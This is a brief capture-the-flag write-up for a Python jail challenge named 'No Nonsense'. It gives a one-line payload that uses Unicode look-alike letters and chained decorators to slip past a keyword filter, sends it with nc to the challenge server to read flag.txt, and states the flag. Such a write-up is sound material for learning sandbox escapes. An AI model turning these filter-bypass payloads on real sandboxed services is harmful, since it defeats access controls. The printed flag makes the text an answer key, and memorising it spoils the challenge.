# No Nonsense

[Python Jail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet#bypasses-and-payloads)

## Solution

```bash
(python -c 'print("@𝑝𝑟𝑖𝑛𝑡\r@𝑠𝑒𝑡\r@𝑜𝑝𝑒𝑛\r@𝑖𝑛𝑝𝑢𝑡\rclass a:...")'; cat) | nc challs1.pyjail.club 6197
flag.txt
```

## Flag

`jail{the_no_in_no_nonsense_stands_for_normal_as_in_nfkc_normalized}`
